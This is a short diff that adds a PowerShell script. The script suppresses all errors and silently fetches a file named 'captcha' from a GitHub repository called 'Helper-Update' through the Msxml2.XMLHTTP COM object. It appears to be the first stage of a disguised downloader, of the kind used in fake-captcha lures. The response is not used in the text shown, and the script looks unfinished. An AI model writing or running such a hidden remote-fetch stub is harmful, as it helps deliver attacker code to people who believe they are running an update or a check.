@@ -1,0 +1,15 @@
+$ErrorActionPreference = 'SilentlyContinue'
+
+
+$url = 'https://raw.githubusercontent.com/pourpory-sig/Helper-Update/main/captcha'
+
+
+try {
+    $req = New-Object -ComObject Msxml2.XMLHTTP
+    $req.open('GET', $url, $false)
+    $req.send()
+   
+}
+    
+ 
+
